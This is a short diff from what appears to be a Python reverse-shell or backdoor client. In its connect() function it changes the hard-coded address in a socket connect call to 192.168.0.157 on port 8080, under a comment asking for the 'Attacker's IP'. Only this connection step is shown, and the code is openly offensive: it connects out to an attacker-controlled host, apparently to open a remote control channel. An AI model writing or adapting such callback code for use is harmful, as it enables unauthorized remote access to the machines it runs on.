@@ -70,7 +70,7 @@ def connect():
         try:
             
             # Note: Please Place Attacker's IP Here
-            s.connect(('192.168.0.86', 8080))
+            s.connect(('192.168.0.157', 8080))
 
             # Connected
             connected = True
